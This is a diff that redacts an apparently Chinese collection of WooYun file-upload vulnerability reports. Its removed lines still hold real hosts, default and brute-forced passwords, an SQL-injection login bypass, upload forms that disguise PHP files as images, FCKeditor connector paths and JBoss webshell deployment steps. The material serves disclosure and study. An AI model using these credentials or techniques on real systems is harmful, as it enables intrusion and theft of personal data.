-**详情**: http://jrwork.eastcom.com/brm/portalbcs/framework.do?action=index&&action=login此处存在弱口令用户名:amdin密码:admin123导致上百万敏感数据泄露泄露并可以修改与各大银行之间的客户结构，4000多份销售合同，3000份服务合同，60000多份发货详情信息，1000余条开票信息，1000余条收款信息，60000多份设备方案信息+客户详情信息上万条客户投诉信息以及回访信息，50000多条设备安装信息（包括客户单位，地址），50000多条库存信息，100000余条收货详情，28万余条返货详情，近50万条短信记录信息（客户名称，单位，电话信息泄露），15万条邮件记录（客户名称，单位，联系方式），近1600条内部员工电话，姓名，OA邮箱地址，所属机构等...
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 太多了，没有一一截图后台页面登陆之后近50w邮件信息泄露，包括地址，联系人以及电话号码近30w邮包信息泄露1500名内部员工信息泄露任意文件上传
 
@@ -13732,7 +13732,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 以前自己记录留下来的，现在才翻出来，可能不详细。，打开网络课网站，如图，登陆进去，现在网盘里传一个PHP文件，网盘竟然没过滤PHP文件。，然后，进入邮件系统，，进入后选择使用网盘文件，然后选择php文件，在切换到HTML下，就可以看到这个PHP文件在服务器上路径了，http://xxx.edu.cn/SCR2006/Courseware/NetDisk/5531/111026085064.php,执行的时候好像不能写php大马，写个asp上去就可以了。这个系统数据库用户用的是sa，有点。。
+**详情**: 以前自己记录留下来的，现在才翻出来，可能不详细。，打开网络课网站，如图，登陆进去，现在网盘里传一个PHP文件，网盘竟然没过滤PHP文件。，然后，进入邮件系统，，进入后选择使用网盘文件，然后选择php文件，在切换到HTML下，就可以看到这个PHP文件在服务器上路径了，https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -13756,7 +13756,7 @@
 
 **详情**: fck导致任意文件上传
 
-**POC**: http://www.cchve.com.cn/hep/taglib/wysiwyg/newHtmlEditor2/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connectorhttp://www.cchve.com.cn//hep/UserFiles/160153/File/shell.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13776,13 +13776,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新东方任意文件上传  http://w.xdf.cn/
+**详情**: 新东方任意文件上传  https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 修复图片上传禁止上传可执行文件。http://w.xdf.cn/
+**修复**: 修复图片上传禁止上传可执行文件。https://example.com/[已脱敏]
 ---
 
 ---
@@ -13798,9 +13798,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://zyhjxy.scau.edu.cn/special/10junxun//admin/FCKeditor/editor/filemanager/connectors/test.html#
+**详情**: 地址：https://example.com/[已脱敏]
 
-**POC**: 建立了xiao.asp的文件夹后上马上不了，蛋疼，http://zyhjxy.scau.edu.cn//uploadfile/file/2014092607423273499.txt
+**POC**: 建立了xiao.asp的文件夹后上马上不了，蛋疼，https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13820,7 +13820,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、无意中找到一个未授权访问的后台.http://btr.800best.com/manage/权限还挺多的, 资料添加/新闻添加/经验分享管理/文件上传等.2、发现上传文件页面, 有个"查看文件库", 点进去后发现大量文件. 看看有没有可以利用的一些信息额, 没有什么用,再找找.得到所有网点的编号. 看看能不能利用它登录一些系统呢？3、http://btr.800best.com/i/login.asp百世快运用户名: 网点信息792个信息 + 数量为20的弱口令字典, 爆破得到以下部分信息id=4500420 pwd=666666id=2141512 pwd=888888id=3623071 pwd=123456id=5233730 pwd=123456id=3253040 pwd=123456id=3252070 pwd=1234567id=2500001 pwd=88888888i
+**详情**: 1、无意中找到一个未授权访问的后台.https://example.com/[已脱敏] 资料添加/新闻添加/经验分享管理/文件上传等.2、发现上传文件页面, 有个"查看文件库", 点进去后发现大量文件. 看看有没有可以利用的一些信息额, 没有什么用,再找找.得到所有网点的编号. 看看能不能利用它登录一些系统呢？3、https://example.com/[已脱敏] 网点信息792个信息 + 数量为20的弱口令字典, 爆破得到以下部分信息id=4500420 pwd=666666id=2141512 pwd=888888id=3623071 pwd=123456id=5233730 pwd=123456id=3253040 pwd=123456id=3252070 pwd=1234567id=2500001 pwd=88888888i
 
 **POC**: 已证明!PS:相关文件已经删除, 怕造成影响, 未深入.如果危害不够, 可以补充的
 
@@ -13886,9 +13886,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 三易通（进销存软件） SQL注射漏洞 后台管理登陆 文件上传公司网站 http://www.eeesoft.cn不多说，图片说明
+**详情**: 三易通（进销存软件） SQL注射漏洞 后台管理登陆 文件上传公司网站 https://example.com/[已脱敏]
 
-**POC**: 三易通（进销存软件） SQL注射漏洞 后台管理登陆 文件上传公司网站 http://www.eeesoft.cn不多说，图片说明
+**POC**: 三易通（进销存软件） SQL注射漏洞 后台管理登陆 文件上传公司网站 https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13908,9 +13908,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 后台登录地址http://60.13.131.206:81/admin/index.aspadmin' or 'a'='a   密码随便还存在FCK编辑器漏洞，以及一处上传漏洞上传地址：http://60.13.131.206:81/adminhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload.asp
+**详情**: 后台登录地址http://[IP已脱敏] or 'a'='a   密码随便还存在FCK编辑器漏洞，以及一处上传漏洞上传地址：http://[IP已脱敏]
 
-**POC**: 后台登录地址http://60.13.131.206:81/admin/index.aspadmin' or 'a'='a   密码随便还存在FCK编辑器漏洞，以及一处上传漏洞上传地址：http://60.13.131.206:81/adminhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload.asp
+**POC**: 后台登录地址http://[IP已脱敏] or 'a'='a   密码随便还存在FCK编辑器漏洞，以及一处上传漏洞上传地址：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -13930,7 +13930,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 近期，山东省人力资源和社会保障厅委托山东省经济和信息化委员会开发山东省专业技术人员职称申报评审系统【http://sdzc.sdeic.gov.cn/eap/】由原来的c/s模式改为b/s模式了。新开的的系统就会有可能出现Bug。任意上传漏洞先注册，登陆，职称申报，基本信息，里面有一个申报人照片，经测试可以上传任何文件，没有进行过滤。里面现在有3万多条信息，这可是全省人才的信息。
+**详情**: 近期，山东省人力资源和社会保障厅委托山东省经济和信息化委员会开发山东省专业技术人员职称申报评审系统【https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -13940,8 +13940,8 @@
 ---
 
 ---
-### [wooyun-2012-015881] 百度网盘极速秒传设计缺陷
-**厂商**: 百度 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2012-015881] 某搜索引擎网盘极速秒传设计缺陷
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 上传功能
 
@@ -13952,7 +13952,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度网盘,安装了极速秒传插件.上传网盘,提示如图信息时,这种情况下大文件传输是秒传,可以推测网盘没有上传数据,比对了MD5值之类的hash,如果MD5值一样,网盘把文件名上传体现在列表中.实际测试,准备两个不同内容但是同MD5值的文件,两个不同内容的文件上传后,下载下来发现,两个文件内容一样了.
+**详情**: 某搜索引擎网盘,安装了极速秒传插件.上传网盘,提示如图信息时,这种情况下大文件传输是秒传,可以推测网盘没有上传数据,比对了MD5值之类的hash,如果MD5值一样,网盘把文件名上传体现在列表中.实际测试,准备两个不同内容但是同MD5值的文件,两个不同内容的文件上传后,下载下来发现,两个文件内容一样了.
 
 **POC**: 安装极速秒传插件,准备两个不同内容但是同MD5值的文件,两个不同内容的文件上传后,下载下来发现,两个文件内容一样了.各位可以自测.
 
@@ -13974,9 +13974,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 河北汽车网存在上传漏洞编辑器地址：http://www.hebcar.com/fckeditor/editor/filemanager/connectors/test.html
+**详情**: 河北汽车网存在上传漏洞编辑器地址：https://example.com/[已脱敏]
 
-**POC**: 漏洞证明：http://www.hebcar.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/file/1414244374591808779.txt
+**POC**: 漏洞证明：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14018,7 +14018,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标:http://jzcs.51web.com/先注册个用户..进入互助问答http://jzcs.51web.com/maq/class/下面有上传啊 哈.直接本地构造个表单 可以使上传文件任意名(后缀必须是jpg什么的).,利用IIS6解析就行了..这是PHPWEB的一个0day啦 很多人都知道..<form name="uploadForm" method="post" enctype="multipart/form-data" action="http://jzcs.51web.com/maq/upload.php"><input type="text" name="fileName" value="hack.php;.jpg" /><input type="hidden" name="attachPath" value="news/pics/" /><input type="f
+**详情**: 目标:https://example.com/[已脱敏] 哈.直接本地构造个表单 可以使上传文件任意名(后缀必须是jpg什么的).,利用IIS6解析就行了..这是PHPWEB的一个0day啦 很多人都知道..<form name="uploadForm" method="post" enctype="multipart/form-data" action="https://example.com/[已脱敏]"><input type="text" name="fileName" value="hack.php;.jpg" /><input type="hidden" name="attachPath" value="news/pics/" /><input type="f
 
 **POC**: 神马会员都有了.嘻嘻
 
@@ -14028,8 +14028,8 @@
 ---
 
 ---
-### [wooyun-2012-013925] 百度分站上传未过滤导致任意代码执行
-**厂商**: 百度 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2012-013925] 某搜索引擎分站上传未过滤导致任意代码执行
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -14040,9 +14040,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 此页面没有过滤：http://madv.baidu.com/user/addQuali.html
+**详情**: 此页面没有过滤：https://example.com/[已脱敏]
 
-**POC**: http://madv.baidu.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/quali/ce4fbd02c8d6813a9ce4cdbc.jsp[/home/work/madv-web/apache-tomcat-6.0.32/webapps/mob_ads_advhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/quali/]$ ifconfigeth1      Link encap:Ethernet  HWaddr 84:2B:2B:14:CB:9Finet
+**POC**: https://example.com/[已脱敏]]$ ifconfigeth1      Link encap:Ethernet  HWaddr 84:2B:2B:14:CB:9Finet
 
 **绕过**: 直接利用
 
@@ -14062,9 +14062,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 深圳市出入境检验检疫局某处上传漏洞。是一个对FCK编辑器越权操作的上传，问题地址：http://zwdt.szciqic.net/zw/external/notice!getNoticeInfo.action?id=1718496表面看来没有问题，当在网址后面提交单引号时，出现了以下编辑器。http://zwdt.szciqic.net/zw/external/notice!getNoticeInfo.action?id=1718496'
+**详情**: 深圳市出入境检验检疫局某处上传漏洞。是一个对FCK编辑器越权操作的上传，问题地址：https://example.com/[已脱敏]'
 
-**POC**: http://zwdt.szciqic.net/zw/userfiles/image/QQ%E5%9B%BE%E7%89%8720141106150424.jpg上传一个图片
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14084,7 +14084,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞文件：celive\live\doajaxfileupload.php<form enctype="multipart/form-data" method="post" action="http://www.cmseasy.cn/celive/live/doajaxfileupload.php"><input type="file" name="fileToUpload"><input type="submit" value="上传"></form>http://www.cmseasy.cn/celive/uploadfiles/CELIVE-2vOWcBQMQR.php;.jpg
+**详情**: 漏洞文件：celive\live\doajaxfileupload.php<form enctype="multipart/form-data" method="post" action="https://example.com/[已脱敏]"><input type="file" name="fileToUpload"><input type="submit" value="上传"></form>https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -14106,7 +14106,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: cms使用了ckeditor编辑器，好像已经二次开发。在上传的时候没有做好过滤。根据tomcat的默认配置，支持解析jspx，导致了漏洞的触发<form enctype="multipart/form-data" action="http://www.KnifeCMS.com/FileUpload" method="POST"> <input name="filedata" type="file" /><input type="submit" value="GO" /> </form>搜索关键字 inurl:type.do?tid=
+**详情**: cms使用了ckeditor编辑器，好像已经二次开发。在上传的时候没有做好过滤。根据tomcat的默认配置，支持解析jspx，导致了漏洞的触发<form enctype="multipart/form-data" action="https://example.com/[已脱敏]" method="POST"> <input name="filedata" type="file" /><input type="submit" value="GO" /> </form>搜索关键字 inurl:type.do?tid=
 
 **POC**: (见原文)
 
@@ -14194,9 +14194,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://haha.sogou.com/submit上传时抓包改成php  Go
+**详情**: https://example.com/[已脱敏]  Go
 
-**POC**: http://haha.sogou.com/submit上传时抓包改成php  Go
+**POC**: https://example.com/[已脱敏]  Go
 
 **绕过**: 直接利用
 
@@ -14227,7 +14227,7 @@
 
 ---
 ### [wooyun-2015-0160226] 淄博市网上公安局任意文件上传漏洞（可查看任意举报内容）
-**厂商**: http://www.zbga.gov.cn/ | **年份**: 2015 | **类型**: 文件上传导致任意代码执行
+**厂商**: https://example.com/[已脱敏] | **年份**: 2015 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -14262,7 +14262,7 @@
 
 **详情**: 已知几个地区的系统地址mask 区域1.://**.**.**//sy.jlslgy.com_2.://**.**.**//bc.jlslgy.com/ _3.://**.**.**//ly.jlslgy.com/ _4.://**.**.**//th.jlslgy.com/ _5.://**.**.**//bs.jlslgy.com/ _6.://**.**.**//sp.jlslgy.com/ _7.://**.**.**//yb.jlslgy.com/ _*****^*****
 
-**POC**: 举例证明任意文件上传位置http://sy.jlslgy.com/SysFun/UploadFile.htm注意发送数据是需要修改filename参数在aa.aspx后面添加空格webshell地址http://sy.jlslgy.com/UploadFile/aa.aspx密码chopper查找配置文件获取数据库连接信息登陆数据库我不是脱裤的，不进行进一步利用证明了。
+**POC**: 举例证明任意文件上传位置https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14304,9 +14304,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 佛山市天博网络科技有限公司（原缘网设计）成立于2006年，拥有多年的网站建设经验，是集网站策划、网站功能模块开发、网站美工设计、网站程序开发等专业化运作于一体的运营团队，具备承接各种规模和类型的网站设计和开发能力。为客户提供的服务项目包括：网站建设、微网站设计、微商城建设、微信营销、网站优化（SEO）、网站推广、域名申请、空间租用等,曾先后多家知名企业和机构提供了一流的网站策划和设计服务，成功帮助客户取得了良好的市场效益，获得了客户的一致好评。官网：http://www.yuanweb.cn
+**详情**: 佛山市天博网络科技有限公司（原缘网设计）成立于2006年，拥有多年的网站建设经验，是集网站策划、网站功能模块开发、网站美工设计、网站程序开发等专业化运作于一体的运营团队，具备承接各种规模和类型的网站设计和开发能力。为客户提供的服务项目包括：网站建设、微网站设计、微商城建设、某互联网公司营销、网站优化（SEO）、网站推广、域名申请、空间租用等,曾先后多家知名企业和机构提供了一流的网站策划和设计服务，成功帮助客户取得了良好的市场效益，获得了客户的一致好评。官网：https://example.com/[已脱敏]
 
-**POC**: 该建站程序存在多处任意上传漏洞  无需登录http://www.fsfa2008.com/admin/upfile.asphttp://www.fsfa2008.com/admin/UpFilePhoto.asp后门地址：http://www.fsfa2008.com/admin/diy.asphttp://www.gzguojing.com/admin/UpFilePhoto.asphttp://www.gzguojing.com/admin/upfile.asp后门地址：http://www.gzguojing.com/admin/diy.asphttp://www.fskuanpu.co
+**POC**: 该建站程序存在多处任意上传漏洞  无需登录https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14348,7 +14348,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 前台：http://125.35.24.219/publish/default/后台：http://125.35.24.219/publish/default/后台登陆账户：admin/admin后台存在任意文件长传：
+**详情**: 前台：http://[IP已脱敏]
 
 **POC**: 见详细说明
 
@@ -14370,9 +14370,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: WooYun: 某通用型高校cms任意文件上传漏洞Coody 牛挖掘过上传点啊,于是踩点发现还有一个默认的编辑器,可以修改样式达到任意文件上传.关键字：inurl:info_details.jsp?seq默认编辑器地址：eWebEditor_V5.0/admin/default.jspeditor/admin/login.jsp列子：http://211.87.126.13/index/editor/admin/login.jsphttp://xggl.bjmu.edu.cn:8081/eWebEditor_V5.0/admin/default.jsphttp://www.usrn.edu.cn/eWebEditor_V5.0/admin/default.jsphttp://210.38.57.70:8180/eWebEditor_V5.0/admin/default.jsphttp://
+**详情**: WooYun: 某通用型高校cms任意文件上传漏洞Coody 牛挖掘过上传点啊,于是踩点发现还有一个默认的编辑器,可以修改样式达到任意文件上传.关键字：inurl:info_details.jsp?seq默认编辑器地址：eWebEditor_V5.0/admin/default.jspeditor/admin/login.jsp列子：http://[IP已脱敏]
 
-**POC**: 默认帐号密码：admin登录发现能遍历目录发现另外一处上传漏洞.http://211.65.116.18/editorlmpz/upload.jsp<script language=javascript>config.attachSeq=-1;parent.UploadSaved('/UploadFile/1/d/08d450cc44def7e2662c83d14b4683d1.jsp');var obj=parent.dialogArguments.dialogArguments;if (!obj) obj=parent.dialogArguments;try{obj.addUploadFi
+**POC**: 默认帐号密码：admin登录发现能遍历目录发现另外一处上传漏洞.http://[IP已脱敏] language=javascript>config.attachSeq=-1;parent.UploadSaved('/UploadFile/1/d/08d450cc44def7e2662c83d14b4683d1.jsp');var obj=parent.dialogArguments.dialogArguments;if (!obj) obj=parent.dialogArguments;try{obj.addUploadFi
 
 **绕过**: 直接利用
 
@@ -14392,9 +14392,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 不能过度依赖供应商，他说修复其实都是骗人的地址：http://learning.ufh.com.cn/CVS/Entrieshttp://learning.ufh.com.cn/adm/CVS/Entries
+**详情**: 不能过度依赖供应商，他说修复其实都是骗人的地址：https://example.com/[已脱敏]
 
-**POC**: 目录遍历http://learning.ufh.com.cn/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/../../http://learning.ufh.com.cn/wooyun.txt
+**POC**: 目录遍历https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14402,8 +14402,8 @@
 ---
 
 ---
-### [wooyun-2012-06381] 中国联通某商城上传漏洞
-**厂商**: 中国联通 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-06381] 某运营商某商城上传漏洞
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 上传功能
 
@@ -14458,9 +14458,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://itlianghui.ccw.com.cn/2007/upload.php
+**详情**: 地址：https://example.com/[已脱敏]
 
-**POC**: 打开:http://itlianghui.ccw.com.cn/2007/upload.php选择大马上传后（红框内为地址）:大马地址：http://itlianghui.ccw.com.cn/2007https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/201306/20130611190244161.php
+**POC**: 打开:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14468,8 +14468,8 @@
 ---
 
 ---
-### [wooyun-2013-022950] 中国移动综合业务受理系统JBOSS上传漏洞
-**厂商**: 中国移动通信 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2013-022950] 某运营商综合业务受理系统JBOSS上传漏洞
+**厂商**: 某运营商通信 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -14480,9 +14480,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国移动业务受理系统使用了JBOSS系统，JBOSS系统本身存在上传漏洞以及敏感信息。
+**详情**: 某运营商业务受理系统使用了JBOSS系统，JBOSS系统本身存在上传漏洞以及敏感信息。
 
-**POC**: 地址：http://115.239.227.141:8080/jmx-console/然后在该页面中搜索“jboss.deployment”，并找到* flavor=URL,type=DeploymentScanner，然后访问链接在void addURL()函数ParamValue出填写war格式的jsp马的地址，点击invoke然后在URLList已经出现刚才的地址然后Apply Change。敏感信息：http://115.239.227.141:8080/kylin/
+**POC**: 地址：http://[IP已脱敏] flavor=URL,type=DeploymentScanner，然后访问链接在void addURL()函数ParamValue出填写war格式的jsp马的地址，点击invoke然后在URLList已经出现刚才的地址然后Apply Change。敏感信息：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -14502,7 +14502,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://coc.jianshe99.com首先看到这个考试系统我就想到造价师的考试好像是蛮困难的。顺便看看这个站吧。随便点一个2级造价师考试系统然后进行注册之后再企业人员管理中添加人员相信大家也看到了又一个身份证上传的地方，就是这个关键地方。直接上传我的sys.jsp小马然后么  直接开菜刀连接一下然后么  这种站我感觉对于做黑产的牛来说应该有些价值，不过我是好人。我肯定不会干这种事情。我是好人。啊呜。。。。。。
+**详情**: https://example.com/[已脱敏]  直接开菜刀连接一下然后么  这种站我感觉对于做黑产的牛来说应该有些价值，不过我是好人。我肯定不会干这种事情。我是好人。啊呜。。。。。。
 
 **POC**: 详细说明里写的很清楚了
 
@@ -14526,7 +14526,7 @@
 
 **详情**: 
 
-**POC**: 1.重庆市九龙坡区人民法院http://www.cqjlpfy.gov.cn/2.该网站后台路径及弱口令http://www.cqjlpfy.gov.cn:8090/login.htm用户名：admin，密码：admin3.查看“通讯录管理” - “职员信息管理”，可以查看203位法官信息
+**POC**: 1.重庆市九龙坡区人民法院https://example.com/[已脱敏] - “职员信息管理”，可以查看203位法官信息
 
 **绕过**: 直接利用
 
@@ -14546,7 +14546,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.taccb.com.cn/fckeditor/editor/filemanager/connectors/test.html#
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -14568,7 +14568,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 注入点http://qhld.ncu.edu.cn/show.asp?id=487上传点http://qhld.ncu.edu.cn/upload.asp后台http://qhld.ncu.edu.cn/login.aspusername:admin password:admin159
+**详情**: 注入点https://example.com/[已脱敏] password:admin159
 
 **POC**: 注入上传后台
 
@@ -14590,7 +14590,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 搜索：site:uctest.ucweb.com存在大量测试程序，和列目录程序如：http://uctest.ucweb.com:8060/my_navi/manager/mynavclient/showmynav.phphttp://uctest.ucweb.com:81/discuzx2/ (没打补丁)http://uctest.ucweb.com:81/wml/Download/uploadlimited/wap_camera.xhtml(文件上传漏洞)数据库是root权限，由于服务上存在各种有用没用的程序，也与目前使用的应用有所关联，因此存在被进一步渗透的风险。
+**详情**: 搜索：site:uctest.ucweb.com存在大量测试程序，和列目录程序如：https://example.com/[已脱敏] (没打补丁)https://example.com/[已脱敏])数据库是root权限，由于服务上存在各种有用没用的程序，也与目前使用的应用有所关联，因此存在被进一步渗透的风险。
 
 **POC**: (见原文)
 
@@ -14612,7 +14612,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 后台地址泄露：http://admin.96188.com/Login.aspx?returnUrl=/index.aspx而此处很蛋疼：找到个高权限用户，默认密码：123456登录后，震惊了，aspx任意上传！！！后台：上传：在商品资料基础维护任意上传：
+**详情**: 后台地址泄露：https://example.com/[已脱敏]
 
 **POC**: 杭州20万个人信息泄露！！！包括个人账户余额！
 
@@ -14634,7 +14634,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://ndj.gdwater.gov.cn/Login.aspx  此后台弱口令adminadmin后台文件上传处上传小马菜刀连之
+**详情**: https://example.com/[已脱敏]  此后台弱口令adminadmin后台文件上传处上传小马菜刀连之
 
 **POC**: 翻数据库配置文件找到sa密码直接新建超级管理员执行成功   远程服务器好多站点渗透结束  不敢动任何数据
 
@@ -14658,7 +14658,7 @@
 
 **详情**: 上传图片没有限制后缀。
 
-**POC**: http://ctquan.com/system/photos/avatars/000/004/299/original/838883634.htmhttp://ctquan.com/system/photos/avatars/000/004/300/original/1.txt
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14678,9 +14678,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://test.frisochina.com/Admin/fckeditor/editor/filemanager/connectors/test.html然后导致主站被沦陷
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://test.frisochina.com/Admin/fckeditor/editor/filemanager/connectors/test.html然后导致主站被沦陷
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14700,9 +14700,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 案例如下:http://zpxx.nh.edu.sh.cn/eduplate/RES/ftb.insertFile.aspxhttp://tywx.mhedu.sh.cn/EduPlate/RES/ftb.insertFile.aspxhttp://www.peijia.com/EduPlate/RES/ftb.insertFile.aspxhttp://www.pjsyxx.com/EduPlate/RES/ftb.insertFile.aspxhttp://www.whei.cn//EduPlate/RES/ftb.insertFile.aspxhttp://www.psjm.pudong-edu.sh.cn/EduPlate/RES/ftb.insertFile.aspx1.测试案例:http://www.psjm.pudong-edu.sh.cn/EduPlate/RES/ftb.
+**详情**: 案例如下:https://example.com/[已脱敏]
 
-**POC**: 1.测试案例:http://www.psjm.pudong-edu.sh.cn/EduPlate/RES/ftb.insertFile.aspxhttp://www.psjm.pudong-edu.sh.cn/images/wooyun.aspx
+**POC**: 1.测试案例:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14746,7 +14746,7 @@
 
 **详情**: 先说个问题。此厂商在乌云已经有账号，但是之前对此套系统的漏洞视而不见，不打算进行修复，继续将漏洞提交给他们处理，可能会危害到客户的利益，在这我建议给cert通报以促进他们进行整改。（如果要给原厂商处理，那去掉我这段话……）前大牛的漏洞：WooYun: 用友某系统存在通用型远程代码执行是用友的e-Learning存在任意文件上传和任意文件下载。不过要一个普通账户登录才可利用，当然我们可以暴力破解……没有验证码
 
-**POC**: 首先需要一个低权限账号登录（反正没有验证码，设定好简单密码，按数字直接丢去暴了都没有问题）给出几个默认或简单密码的：http://58.214.233.113:8800/lmsv5/00041013/12345600041014/12345600041012/123456http://60.216.4.162:9091/lmsv5/107649/111111107648/111111107640/111111文件上传http://60.216.4.162:9091/lmsv5/uploadfile!LoginUploadFile.action?uploadFileType=jsp看源码：另外一
+**POC**: 首先需要一个低权限账号登录（反正没有验证码，设定好简单密码，按数字直接丢去暴了都没有问题）给出几个默认或简单密码的：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -14754,8 +14754,8 @@
 ---
 
 ---
-### [wooyun-2016-0170837] 中国移动某平台存在多个漏洞
-**厂商**: 中国移动 | **年份**: 2016 | **类型**: 未授权访问/权限绕过
+### [wooyun-2016-0170837] 某运营商某平台存在多个漏洞
+**厂商**: 某运营商 | **年份**: 2016 | **类型**: 未授权访问/权限绕过
 
 **元思考**: 触发信号: 上传功能
 
@@ -14766,7 +14766,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国移动某平台存在多个漏洞1.目录遍历2.整站下载3.信息泄漏4.任意文件上传
+**详情**: 某运营商某平台存在多个漏洞1.目录遍历2.整站下载3.信息泄漏4.任意文件上传
 
 **POC**: url：http://**.**.**.**/第一个，存在目录遍历漏洞http://**.**.**.**/mobile/http://**.**.**.**/images/第二个，存在整站文件打包下载第三个，信息泄漏第四个，任意文件上传可利用burp进行抓包，抓包后修改其后缀，然后再上传，就可以达到任意文件上传由于电脑burp配置不当，导致无法演示上传位置:http://**.**.**.**/Register.aspx上传后文件位置：http://**.**.**.**/uploadimages/
 
@@ -14788,7 +14788,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 湖北气象局FCK漏洞FCK编辑器地址可以直接谷歌搜索到，http://www.hbqx.gov.cn/FCkeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test1.html访问进去直接上传图片格式木马。http://www.hbqx.gov.cn/UploadFile/2.php;.gif
+**详情**: 湖北气象局FCK漏洞FCK编辑器地址可以直接谷歌搜索到，https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -14810,7 +14810,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 刚看到乌云上有个成功入侵海澜之家网站的：WooYun: 海澜之家网站沦陷、全部信息泄漏是fckeditor的/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html上传漏洞。习惯性看了下这个页面已不存在，但是fckeditor还是存在的，自己构造上传表单提交给http://www.learnchinese.cn/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/asp/upload.asp即可上传任意文件。这个是很早以前的fckeditor Meida类型任意文件上传！
+**详情**: 刚看到乌云上有个成功入侵海澜之家网站的：WooYun: 海澜之家网站沦陷、全部信息泄漏是fckeditor的/editor/filemanagerhttps://example.com/[已脱敏] Meida类型任意文件上传！
 
 **POC**: 各种目录权限正如WyH4ck所说的，各种跨目录，各种可写！！题外话：我想说上次买了条海澜之家的西裤，水洗时候严重掉色！！（一条西裤一件短袖寸衫还500多！！）
 
@@ -14832,7 +14832,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
